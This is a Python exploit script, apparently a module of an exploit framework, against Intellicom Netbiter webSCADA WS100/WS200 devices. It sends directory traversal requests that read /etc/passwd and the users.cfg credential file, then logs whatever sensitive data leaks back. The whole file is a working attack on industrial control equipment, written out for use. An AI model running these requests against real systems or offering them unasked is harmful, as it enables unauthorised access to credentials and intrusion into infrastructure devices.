import requests
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 80):
    """
    Exploit Title: Intellicom Netbiter webSCADA - Multiple Vulnerabilities
    Source: BID 43636
    Author: Eugene Salov
    Affected Products: Netbiter WS100 / WS200
    Exploit Type: Directory Traversal / Info Disclosure
    """

    vulnerable_paths = [
        "/cgi-bin/read.cgi?page=../../../../../../../../../../../etc/passwd%00",
        "/cgi-bin/read.cgi?file=/home/config/users.cfg",
        "/cgi-bin/read.cgi?page=config.html&file=/home/config/pages/2.conf&section=PAGE2"
    ]

    for path in vulnerable_paths:
        url = f"http://{target}:{port}{path}"
        try:
            logger.info(f"[*] Attempting to access: {url}")
            response = requests.get(url, timeout=5)

            if response.status_code == 200 and any(keyword in response.text for keyword in ["root:", "admin", "[PAGE2]", "[USER"]):
                logger.success(f"[+] Successfully exploited info disclosure: {path}")
                logger.info(f"[+] Response Snippet:\n{response.text[:300]}")
                return True
            else:
                logger.warning(f"[-] No sensitive data leaked from: {path}")

        except Exception as e:
            logger.error(f"[!] Request failed for {url} - Error: {e}")

    return False
